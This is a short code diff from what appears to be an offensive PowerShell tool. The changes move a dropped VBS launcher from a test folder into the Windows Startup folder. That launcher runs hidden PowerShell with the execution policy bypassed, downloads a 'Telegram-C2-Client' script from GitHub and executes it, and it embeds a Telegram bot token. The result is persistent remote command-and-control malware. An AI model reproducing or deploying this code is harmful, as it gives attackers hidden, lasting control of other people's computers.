@@ -410,14 +410,14 @@ userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
 objShell.Run "powershell -NoP -Ep Bypass -W H -C $tg='6609237868:AAH3RePygk7Q6uAbvpasSiddOHIrLM3QGYI';irm https://raw.githubusercontent.com/poiuztreq/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex""", 0, True
 '@
 
-$pth = "$env:USERPROFILE\Desktop\test\service.vbs"
+$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 Write-Output "Persistance Added."
 rm -path "$env:TEMP\temp.ps1" -Force
 }
 
 Function Remove-Persistance{
-rm -Path "$env:USERPROFILE\Desktop\test\service.vbs"
+rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 rm -Path "$env:USERPROFILE\Desktop\test\copy.ps1"
 Write-Output "Uninstalled."
 }
